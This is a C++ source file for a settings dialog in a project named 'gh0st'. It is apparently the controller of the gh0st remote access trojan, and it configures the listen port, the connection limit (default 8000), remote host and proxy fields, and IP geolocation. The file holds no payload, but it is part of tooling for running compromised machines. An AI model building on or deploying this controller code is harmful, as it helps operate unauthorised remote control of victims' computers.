// SettingDlg.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "SettingDlg.h"
//#include "encode.h"
#include "MainFrm.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

extern CMainFrame	*g_pFrame;
extern CIOCPServer	*m_iocpServer;

/////////////////////////////////////////////////////////////////////////////
// CSettingDlg dialog

CSettingDlg::CSettingDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CSettingDlg::IDD, pParent), m_connect_auto(0)
{
	//{{AFX_DATA_INIT(CSettingDlg)
	m_remote_host = ((Cgh0stApp *)AfxGetApp())->m_IniFile.GetString("Connection", "Host", "");
	m_remote_port = ((Cgh0stApp *)AfxGetApp())->m_IniFile.GetString("Connection", "Port", "80");
	//	m_encode = _T("");
	m_listen_port = ((Cgh0stApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "ListenPort", 808);
	m_max_connections = ((Cgh0stApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "MaxConnection", 8000);
	m_bIsDisablePopTips = ((Cgh0stApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "PopTips", false);
	m_bFirstShow = true;
	//}}AFX_DATA_INIT
}

void CSettingDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CSettingDlg)
	//	DDX_Text(pDX, IDC_ENCODE, m_encode);
	DDX_Text(pDX, IDC_LISTEN_PORT, m_listen_port);
	DDV_MinMaxUInt(pDX, m_listen_port, 1, 50000);
	DDX_Text(pDX, IDC_CONNECT_MAX, m_max_connections);
	DDV_MinMaxUInt(pDX, m_max_connections, 1, 100000);
	DDX_Check(pDX, IDC_CONNECT_AUTO, m_connect_auto);
	DDX_Check(pDX, IDC_DISABLE_POPTIPS, m_bIsDisablePopTips);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CSettingDlg, CDialogEx)
	//{{AFX_MSG_MAP(CSettingDlg)
	ON_BN_CLICKED(IDC_RESETPORT, OnResetport)
	ON_BN_CLICKED(IDC_CONNECT_AUTO, OnConnectAuto)
	ON_BN_CLICKED(IDC_DISABLE_POPTIPS, OnDisablePoptips)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CSettingDlg message handlers

BOOL CSettingDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();
	if (m_bFirstShow)
	{
		if (m_remote_host.GetLength() == 0)
		{
			char hostname[256];
			gethostname(hostname, sizeof(hostname));
			HOSTENT *host = gethostbyname(hostname);
			if (host != NULL)
				m_remote_host = inet_ntoa(*(IN_ADDR*)host->h_addr_list[0]);
			else
				m_remote_host = _T("192.168.16.2");
		}
		UpdateData(false);

		OnConnectAuto();

		// 更新字串
		//	OnChangeConfig(0);
		int	nEditControl[] = { IDC_LISTEN_PORT, IDC_CONNECT_MAX, IDC_REMOTE_HOST, IDC_REMOTE_PORT,
			IDC_PROXY_HOST, IDC_PROXY_PORT, IDC_PROXY_USER, IDC_PROXY_PASS };
		for (int i = 0; i < sizeof(nEditControl) / sizeof(int); i++)
			m_Edit[i].SubclassDlgItem(nEditControl[i], this);

		int	nBtnControl[] = { IDC_RESETPORT, IDC_TEST_MASTER, IDC_TEST_PROXY };

		/*	for (i = 0; i < sizeof(nBtnControl) / sizeof(int); i++)
			{
			m_Btn[i].SubclassDlgItem(nBtnControl[i], this);
			m_Btn[i].SetColor(CButtonST::BTNST_COLOR_FG_IN, RGB(255, 0, 0));
			}
			*/
		if (((Cgh0stApp *)AfxGetApp())->m_bIsQQwryExist)
			SetDlgItemText(IDC_SYSTEM_TIPS, _T("找到IP数据库文件: QQWry.Dat"));
		else
			SetDlgItemText(IDC_SYSTEM_TIPS, _T("没有找到QQWry.Dat,地理位置显示失败"));
	}

	m_bFirstShow = false;
	return true;
}

void CSettingDlg::OnResetport()
{
	// TODO: Add your control notification handler code here
	int prev_port = m_listen_port;
	int prev_max_connections = m_max_connections;

	UpdateData(TRUE);

	if (prev_max_connections != m_max_connections)
	{
		if (m_connect_auto)
			InterlockedExchange((LPLONG)&m_iocpServer->m_nMaxConnections, 8000);
		else
			InterlockedExchange((LPLONG)&m_iocpServer->m_nMaxConnections, m_max_connections);
	}

	if (prev_port != m_listen_port)
		g_pFrame->Activate(m_listen_port, m_iocpServer->m_nMaxConnections);

	((Cgh0stApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "ListenPort", m_listen_port);
	((Cgh0stApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "MaxConnection", m_max_connections);
	((Cgh0stApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "MaxConnectionAuto", m_connect_auto);
}

void CSettingDlg::OnConnectAuto()
{
	// TODO: Add your control notification handler code here
	UpdateData(true);
	GetDlgItem(IDC_CONNECT_MAX)->EnableWindow(!m_connect_auto);
}

void CSettingDlg::OnDisablePoptips()
{
	// TODO: Add your control notification handler code here
	UpdateData();
	((Cgh0stApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "PopTips", m_bIsDisablePopTips);
	((Cgh0stApp *)AfxGetApp())->m_bIsDisablePopTips = m_bIsDisablePopTips;
}